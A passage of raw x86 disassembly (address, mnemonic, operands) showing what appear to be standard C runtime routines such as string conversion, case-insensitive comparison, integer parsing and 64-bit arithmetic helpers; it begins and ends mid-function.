  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
